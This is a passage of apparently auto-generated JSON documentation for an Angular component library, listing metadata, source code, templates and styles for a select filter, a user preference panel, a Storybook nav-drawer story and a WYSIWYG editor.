{\r\n\r\n    this.checkboxControl.setValue(isChecked, { emitEvent: false });\r\n  }\r\n\r\n  writeValue(value: unknown) {\r\n    if ( value || value === '' ) {\r\n      this.inputControl.setValue(value);\r\n    }\r\n  }\r\n\r\n  propagateChange = (value: unknown) => {\r\n    this.valueChanges.emit(value);\r\n  };\r\n\r\n  registerOnChange(fn: never): void {\r\n    this.propagateChange = fn;\r\n  }\r\n\r\n  // eslint-disable-next-line\r\n  registerOnTouched(fn: unknown): void {\r\n  }\r\n\r\n  ngOnDestroy() {\r\n\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n  ngAfterViewInit(): void {\r\n    if ( this.select ) {\r\n      this.select.openedChange.pipe(takeUntil(this.destroyed$)).subscribe(open => {\r\n        if ( open && this.focusIfNoValue && this.isMulti ) {\r\n          this.inputElement?.nativeElement.focus();\r\n        }\r\n      });\r\n    }\r\n  }\r\n\r\n  ngOnInit() {\r\n    this.checkboxControl.valueChanges\r\n      .pipe(\r\n        takeUntil(this.destroyed$)\r\n      ).subscribe(isChecked => {\r\n      this.selectAll.emit(isChecked);\r\n    });\r\n\r\n    this.inputControl.valueChanges\r\n      .pipe(\r\n        takeUntil(this.destroyed$)\r\n      ).subscribe(value => {\r\n      if ( !value && this.focusIfNoValue ) {\r\n        requestAnimationFrame(() => this.inputElement.nativeElement.focus());\r\n      }\r\n      this.propagateChange(value);\r\n    });\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-select-filter{\r\n  white-space: nowrap;\r\n  overflow: hidden;\r\n  text-overflow: ellipsis;\r\n  line-height: 36px;\r\n  text-align: left;\r\n  text-decoration: none;\r\n  position: sticky;\r\n  width: 100%;\r\n  top: 0;\r\n  outline: 0;\r\n  display: flex;\r\n  flex-direction: row;\r\n  max-width: 100%;\r\n  box-sizing: border-box;\r\n  align-items: center;\r\n  z-index: 1;\r\n  .sto-form__field{\r\n    height: 48px;\r\n    .mat-form-field-flex {\r\n      padding: 2px 16px;\r\n      height: 48px;\r\n      border-radius: 0;\r\n      .mat-form-field-prefix{\r\n        margin-right: 16px;\r\n      }\r\n    }\r\n    .mat-form-field-underline{\r\n      width: 100%;\r\n      left: 0;\r\n      border-bottom-left-radius: 0;\r\n      border-bottom-right-radius: 0;\r\n      .mat-form-field-underline .mat-form-field-ripple{\r\n        border-bottom-left-radius: 0;\r\n        border-bottom-right-radius: 0;\r\n      }\r\n    }\r\n    &.mat-focused{\r\n      .mat-form-field-underline .mat-form-field-ripple{\r\n        border-bottom-left-radius: 0;\r\n        border-bottom-right-radius: 0;\r\n      }\r\n    }\r\n\r\n  }\r\n\r\n  .sto-form__field .mat-input-wrapper, .sto-form__field .mat-form-field-wrapper{\r\n    margin: 0;\r\n  }\r\n}\r\n\r\n\r\n.sto-select-filter{\r\n  &__select-all{\r\n    border-bottom: solid 1px rgba(0, 0, 0, 0.1);\r\n    width: 100%;\r\n    &.mat-option{\r\n      padding: 24px 16px;\r\n    }\r\n    &__checkbox{\r\n      width: 100%;\r\n      .mat-checkbox-inner-container{\r\n        margin-right: 16px;\r\n      }\r\n      .mat-checkbox-layout, .mat-checkbox-label{\r\n        width: 100%;\r\n      }\r\n    }\r\n  }\r\n}\r\n",
            "styleUrl": "./sto-select-filter.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "select",
              "type": "MatSelect",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 138,
          "jsdoctags": [
            {
              "name": "select",
              "type": "MatSelect",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit",
          "AfterViewInit",
          "OnDestroy",
          "ControlValueAccessor"
        ],
        "accessors": {
          "value": {
            "name": "value",
            "setSignature": {
              "name": "value",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "value",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 57,
              "rawdescription": "\n\nInitial value of the filter\n",
              "description": "<p>Initial value of the filter</p>\n",
              "jsdoctags": [
                {
                  "name": "value",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
                    "getSignature": {
                      "name": "value",
                      "type": "",
                      "returnType": "",
                      "line": 62
                    }
                },
                "total": {
                    "name": "total",
                    "setSignature": {
                      "name": "total",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "total",
                          "type": "number",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 70,
                      "rawdescription": "\n\nLength of unfiltered Array\n",
                      "description": "<p>Length of unfiltered Array</p>\n",
                      "jsdoctags": [
                        {
                          "name": {
                            "pos": 1765,
                            "end": 1770,
                            "flags": 4227072,
                            "modifierFlagsCache": 0,
                            "transformFlags": 0,
                            "kind": 79,
                            "escapedText": "total"
                          },
                          "type": "number",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "pos": 1759,
                            "end": 1764,
                            "flags": 4227072,
                            "modifierFlagsCache": 0,
                            "transformFlags": 0,
                            "kind": 79,
                            "escapedText": "param"
                          },
                          "comment": ""
                        }
                      ]
                    },
                    "getSignature": {
                        "name": "total",
                        "type": "number",
                        "returnType": "number",
                        "line": 74
                    }
                },
                "selected": {
                    "name": "selected",
                    "setSignature": {
                      "name": "selected",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "selected",
                          "type": "number",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 82,
                      "rawdescription": "\n\nDetermines the checkbox state. Can be checked, indeterminate or unchecked\n",
                      "description": "<p>Determines the checkbox state. Can be checked, indeterminate or unchecked</p>\n",
                      "jsdoctags": [
                        {
                          "name": {
                            "pos": 2007,
                            "end": 2015,
                            "flags": 4227072,
                            "modifierFlagsCache": 0,
                            "transformFlags": 0,
                            "kind": 79,
                            "escapedText": "selected"
                          },
                          "type": "number",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "pos": 2001,
                            "end": 2006,
                            "flags": 4227072,
                            "modifierFlagsCache": 0,
                            "transformFlags": 0,
                            "kind": 79,
                            "escapedText": "param"
                          },
                          "comment": ""
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "selected",
                    "type": "number",
                    "returnType": "number",
                    "line": 96
                  }
                }
        },
        "templateData": "<div class=\"sto-form\" style=\"width: 100%\" *ngIf=\"isFilter;else noFilter\">\r\n  <mat-form-field class=\"sto-form__field sto-form__field--without-placeholder\"\r\n                  floatLabel=\"never\">\r\n        <span matPrefix\r\n              *ngIf=\"isMulti !== false\">\r\n            <mat-checkbox color=\"primary\"\r\n           class=\"sto-select-filter__checkbox\"\r\n           #selectAll\r\n           [indeterminate]=\"indeterminate\"\r\n           [formControl]=\"checkboxControl\">\r\n        </mat-checkbox>\r\n        </span>\r\n        <mat-label>Search in list</mat-label>\r\n        <input [formControl]=\"inputControl\"\r\n               #inputElement\r\n               class=\"sto-select-filter__searchfield\"\r\n               autocomplete=\"off\"\r\n               matInput>\r\n        <mat-icon *ngIf=\"inputControl.value?.length > 0\"\r\n                  class=\"mat__icon--clickable\"\r\n                  (click)=\"inputControl.reset()\"\r\n                  matSuffix>close</mat-icon>\r\n        <mat-icon *ngIf=\"inputControl.value?.length <= 0\"\r\n                  matSuffix>search</mat-icon>\r\n    </mat-form-field>\r\n</div>\r\n<ng-template #noFilter>\r\n    <div class=\"sto-select-filter__select-all mat-option\">\r\n        <mat-checkbox color=\"primary\"\r\n                      class=\"sto-select-filter__select-all__checkbox \"\r\n                      #selectAll\r\n                      [indeterminate]=\"indeterminate\"\r\n                      [formControl]=\"checkboxControl\">\r\n           All\r\n        </mat-checkbox>\r\n    </div>\r\n</ng-template>\r\n\r\n\r\n\r\n"
      },
      {
        "name": "StoUserPreferenceComponent",
        "id": "component-StoUserPreferenceComponent-95da78bf1171d77fdd8fd60b9f9c2a8c09e20398cde0fd5c558d69527d59e637adcd72983a56e45571063f6e14ebe388b15eed0f4b7d3d478126d4e7c58104ba",
        "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-user-preference",
        "styleUrls": [
          "./sto-user-preference.component.css"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-user-preference.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "destroyed$",
            "defaultValue": "new Subject<boolean>()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 15,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "form",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "FormGroup",
            "optional": false,
            "description": "",
            "line": 14,
            "modifierKind": [
              123
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "initForm",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 20,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 44,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 33,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {Component, OnDestroy, OnInit} from '@angular/core';\r\nimport {FormBuilder, FormGroup} from '@angular/forms';\r\nimport {take, takeUntil} from 'rxjs/operators';\r\nimport {Subject} from 'rxjs';\r\nimport {StoUserPreferenceService} from './sto-user-preference.service';\r\n\r\n@Component({\r\n  selector: 'sto-user-preference',\r\n  templateUrl: './sto-user-preference.component.html',\r\n  styleUrls: ['./sto-user-preference.component.css']\r\n})\r\nexport class StoUserPreferenceComponent implements OnInit, OnDestroy {\r\n\r\n  public form: FormGroup;\r\n  private destroyed$ = new Subject<boolean>();\r\n\r\n  constructor(private fb: FormBuilder, private service: StoUserPreferenceService) {\r\n  }\r\n\r\n  private initForm(value: boolean ) {\r\n    this.form = this.fb.group({\r\n      hasSelectTextOnFocusEnabled: [value]\r\n    });\r\n    this.form.get('hasSelectTextOnFocusEnabled')?.valueChanges\r\n      .pipe(\r\n        takeUntil(this.destroyed$)\r\n      )\r\n      .subscribe((hasSelectTextOnFocusEnabled) => {\r\n        this.service.setHasSelectTextOnFocusEnabled(hasSelectTextOnFocusEnabled);\r\n      });\r\n  }\r\n\r\n  ngOnInit() {\r\n    this.service.hasSelectTextOnFocusEnabled.asObservable()\r\n      .pipe(\r\n        take(1)\r\n      )\r\n      .subscribe((value) => {\r\n        this.initForm(value);\r\n      });\r\n\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "",
            "styleUrl": "./sto-user-preference.component.css"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "fb",
              "type": "FormBuilder",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "service",
              "type": "StoUserPreferenceService",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 15,
          "jsdoctags": [
            {
              "name": "fb",
              "type": "FormBuilder",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "service",
              "type": "StoUserPreferenceService",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit",
          "OnDestroy"
        ],
        "templateData": "<mat-expansion-panel [expanded]=\"false\">\r\n  <mat-expansion-panel-header>\r\n    <mat-panel-title>Settings<span style=\"opacity: 0.36\">&nbsp;(beta)</span></mat-panel-title>\r\n  </mat-expansion-panel-header>\r\n  <div *ngIf=\"form\" class=\"sto-grid sto-grid--4\">\r\n\r\n    <ng-content></ng-content>\r\n\r\n  </div>\r\n</mat-expansion-panel>\r\n"
      },
      {
        "name": "WrapperComponent",
        "id": "component-WrapperComponent-5d6d04ad7c836f327208680e9798944fa32a252e6e972fa1492b79bd40a335ad300a9ba83fd3ec7c0c2f1e14bb8026764c285bae8c54146b6e1ae003c5dd4125",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "wrapper",
        "styleUrls": [],
        "styles": [],
        "template": "Hi",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\r\nimport { moduleMetadata } from '@storybook/angular';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\r\nimport { MatIconModule, MatIconRegistry } from '@angular/material/icon';\r\nimport { NavDrawerComponent, NavDrawerModule } from '@ngx-stoui/drawer';\r\nimport { RouterTestingModule } from '@angular/router/testing';\r\nimport { BrowserModule } from '@angular/platform-browser';\r\nimport { CommonModule } from '@angular/common';\r\nimport { Component, Injectable } from '@angular/core';\r\nimport { StoAppHeaderModule } from '@ngx-stoui/common';\r\n\r\n@Component({\r\n  selector: 'wrapper',\r\n  template: 'Hi'\r\n})\r\nclass WrapperComponent {\r\n}\r\n\r\n@Injectable({ providedIn: 'root' })\r\nclass IconService {\r\n  constructor(private iconReg: MatIconRegistry) {\r\n    this.iconReg.setDefaultFontSetClass('material-icons-outline');\r\n  }\r\n}\r\n\r\nexport default {\r\n  title: 'Navigation/Drawer',\r\n  component: NavDrawerComponent,\r\n  parameters: {},\r\n  decorators: [\r\n    moduleMetadata({\r\n      declarations: [ WrapperComponent ],\r\n      providers: [ IconService ],\r\n      imports: [\r\n        NavDrawerModule,\r\n        StoAppHeaderModule,\r\n        MatIconModule,\r\n        MatButtonModule,\r\n        BrowserAnimationsModule,\r\n        RouterTestingModule.withRoutes([\r\n          { path: '**', component: WrapperComponent }\r\n        ]),\r\n        BrowserModule,\r\n        CommonModule\r\n      ]\r\n    })\r\n  ],\r\n  argTypes: {\r\n    open: {\r\n      control: {type: 'boolean'}\r\n    }\r\n  }\r\n} as Meta;\r\n\r\nconst Template: Story<NavDrawerComponent> = (args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n};\r\n\r\nconst navigationItems = [\r\n  {\r\n    label: 'Direct route',\r\n    route: [ '/', 'home' ],\r\n    icon: 'home'\r\n  },\r\n  {\r\n    label: 'Internal route title',\r\n    children: [\r\n      {\r\n        route: [ '/', 'route1' ],\r\n        label: 'Internal child route',\r\n      },\r\n      {\r\n        route: [ '/', 'route2' ],\r\n        label: 'Internal child route 2',\r\n      },\r\n      {\r\n        route: [ '/', 'route3' ],\r\n        label: 'Internal child route 3',\r\n      },\r\n      {\r\n        route: [ '/', 'route4' ],\r\n        label: 'Internal child route 4',\r\n      },\r\n      {\r\n        route: [ '/', 'route5' ],\r\n        label: 'Internal child route 5',\r\n      },\r\n      {\r\n        route: [ '/', 'route6' ],\r\n        label: 'Internal child route 6',\r\n      },\r\n    ],\r\n    icon: 'dashboard',\r\n    title: 'Dashboard'\r\n  },\r\n  {\r\n    label: 'External',\r\n    children: [\r\n      {\r\n        link: 'https://example.com',\r\n        target: '_blank',\r\n        label: 'Example.com'\r\n      }\r\n    ],\r\n    icon: 'open_in_new',\r\n  },\r\n  {\r\n    link: '#',\r\n    label: 'Disabled Route',\r\n    children: [],\r\n    icon: 'do_disturb',\r\n    disabled: true\r\n  },\r\n];\r\n\r\nexport const NormalUse = (args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n};\r\nNormalUse.args = {\r\n  height: '100vh',\r\n  navigationItems,\r\n  collapsed: false\r\n};\r\n\r\n\r\nexport const WithAppHeader = (args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n    template: `\r\n    <sto-app-header></sto-app-header>\r\n    <sto-nav-drawer [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\r\n    `\r\n  };\r\n};\r\nWithAppHeader.args = {\r\n  navigationItems,\r\n  collapsed: true,\r\n};\r\n\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": ""
      },
      {
        "name": "WysiwygActionsComponent",
        "id": "component-WysiwygActionsComponent-1eb67e4826c9aaf1cde1635084ae8f782b0eb4c07958b7fafbdd770508de597310eeb5445bd68bcdc96d80375b9d22f565d6d87d1b86fdcc38ba2d8fa7210007",
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg-actions/wysiwyg-actions.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-wysiwyg-actions",
        "styleUrls": [
          "./wysiwyg-actions.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./wysiwyg-actions.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "active",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 10,
            "type": "string[]",
            "decorators": []
          },
          {
            "name": "disabled",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "modifier",
            "defaultValue": "new EventEmitter<string>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 14,
            "type": "EventEmitter"
          }
        ],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, EventEmitter, Input, Output } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-wysiwyg-actions',\r\n  templateUrl: './wysiwyg-actions.component.html',\r\n  styleUrls: [ './wysiwyg-actions.component.scss' ]\r\n})\r\nexport class WysiwygActionsComponent {\r\n  @Input()\r\n  active: string[];\r\n  @Input()\r\n  disabled: boolean;\r\n  @Output()\r\n  modifier = new EventEmitter<string>();\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-wysiwyg {\r\n\r\n}\r\n",
            "styleUrl": "./wysiwyg-actions.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<div class=\"sto-wysiwyg__actions\">\r\n  <div class=\"sto-wysiwyg__buttons\">\r\n    <ng-container *ngIf=\"!disabled\">\r\n      <mat-button-toggle-group [multiple]=\"true\"\r\n                               [value]=\"active\">\r\n        <mat-button-toggle value=\"bold\"\r\n                           title=\"Bold (ctrl + b)\"\r\n                           (change)=\"modifier.emit($event.value)\">\r\n          <mat-icon>format_bold</mat-icon>\r\n        </mat-button-toggle>\r\n        <mat-button-toggle value=\"italic\"\r\n                           title=\"Italic (ctrl + i)\"\r\n                           (change)=\"modifier.emit($event.value)\">\r\n          <mat-icon>format_italic</mat-icon>\r\n        </mat-button-toggle>\r\n        <mat-button-toggle value=\"underline\"\r\n                           title=\"Underline (ctrl + u)\"\r\n                           (change)=\"modifier.emit($event.value)\">\r\n          <mat-icon>format_underline</mat-icon>\r\n        </mat-button-toggle>\r\n      </mat-button-toggle-group>\r\n      <div class=\"divider\"></div>\r\n      <button mat-flat-button\r\n              title=\"Insert hyperlink\"\r\n              (click)=\"modifier.emit('createLink')\"\r\n              class=\"sto-wysiwyg__editor__button\">\r\n        <mat-icon>link</mat-icon>\r\n      </button>\r\n      <div class=\"divider\"></div>\r\n      <button mat-flat-button\r\n              title=\"Create unordered list\"\r\n              (click)=\"modifier.emit('insertUnorderedList')\"\r\n              class=\"sto-wysiwyg__editor__button\">\r\n        <mat-icon>format_list_bulleted</mat-icon>\r\n      </button>\r\n      <button mat-flat-button\r\n              title=\"Create ordered list\"\r\n              (click)=\"modifier.emit('insertOrderedList')\"\r\n              class=\"sto-wysiwyg__editor__button\">\r\n        <mat-icon>format_list_numbered</mat-icon>\r\n      </button>\r\n      <div class=\"divider\"></div>\r\n      <button mat-flat-button\r\n              title=\"Clear formatting on selection\"\r\n              (click)=\"modifier.emit('removeFormat')\"\r\n              class=\"sto-wysiwyg__editor__button\">\r\n        <mat-icon>format_clear</mat-icon>\r\n      </button>\r\n    </ng-container>\r\n  </div>\r\n  <div class=\"user-buttons\">\r\n    <ng-content></ng-content>\r\n  </div>\r\n</div>\r\n"
      },
      {
        "name": "WysiwygComponent",
        "id": "component-WysiwygComponent-3a3f2b5434e685b2e7d98267c134fd55c3830207dcd3b12509043129ac65b08d6af6de6f18cdd61a2bb3c5c845274fd60afd709d4a24e7dd7191df5702dcd8aa",
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [
          {
            "name": "{\n    provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => WysiwygComponent), multi: true\n}",
            "type": "component"
          }
        ],
        "selector": "sto-wysiwyg",
        "styleUrls": [
          "./wysiwyg.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./wysiwyg.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "readonly",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 39,
            "type": "boolean",
            "decorators": []
          }
        ],
            "outputsClass": [],
            "propertiesClass": [
              {
                "name": "active",
                "defaultValue": "[]",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string[]",
                "optional": false,
                "description": "",
                "line": 44,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "destroyed$",
                "defaultValue": "new Subject<boolean>()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 40,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "editor",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLDivElement>",
                "optional": false,
                "description": "",
                "line": 42,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "WysiwygEditorComponent, {read: ElementRef}"
                  }
                ]
              },
              {
                "name": "onTouched",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 45,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "propagateChange",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 115
              },
              {
                "name": "value",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "SafeHtml",
                "optional": false,
                "description": "",
                "line": 43,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "execute",
                "args": [
                  {
                    "name": "method",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 77,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "method",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "listenForSelectEvents",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 63,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 54,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 58,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onKeyDownHandleTab",
                "args": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 94,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnChange",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 119,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnTouched",
                "args": [
                  {
                    "name": "fn",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 123,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDisabledState",
                "args": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 127,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "valueChanged",
                "args": [
                  {
                    "name": "value",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 132,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "writeValue",
                "args": [
                  {
                    "name": "value",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 107,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectionStrategy,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  ElementRef,\r\n  forwardRef,\r\n  Input,\r\n  NgZone,\r\n  OnDestroy,\r\n  SecurityContext,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { DomSanitizer, SafeHtml } from '@angular/platform-browser';\r\nimport { fromEvent, merge, Subject } from 'rxjs';\r\nimport { debounceTime, filter, takeUntil } from 'rxjs/operators';\r\nimport { WysiwygEditorComponent } from './wysiwyg-editor/wysiwyg-editor.component';\r\nimport { Modifiers, validCommands } from './modifiers';\r\nimport { ControlValueAccessor, NG_VALUE_ACCESSOR } from '@angular/forms';\r\n\r\n@Component({\r\n  selector: 'sto-wysiwyg',\r\n  templateUrl: './wysiwyg.component.html',\r\n  styleUrls: [ './wysiwyg.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  providers: [\r\n    {\r\n      provide: NG_VALUE_ACCESSOR,\r\n      useExisting: forwardRef(() => WysiwygComponent),\r\n      multi: true\r\n    }\r\n  ],\r\n})\r\nexport class WysiwygComponent implements AfterViewInit, OnDestroy, ControlValueAccessor {\r\n  // eslint-disable-next-line @angular-eslint/no-input-rename\r\n  @Input('readonly')\r\n  disabled: boolean;\r\n  private destroyed$ = new Subject<boolean>();\r\n  @ViewChild(WysiwygEditorComponent, { read: ElementRef })\r\n  editor: ElementRef<HTMLDivElement>;\r\n  public value: SafeHtml;\r\n  public active: string[] = [];\r\n  public onTouched: unknown;\r\n\r\n  constructor(\r\n    private domSanitizer: DomSanitizer,\r\n    private zone: NgZone,\r\n    private cdr: ChangeDetectorRef\r\n  ) 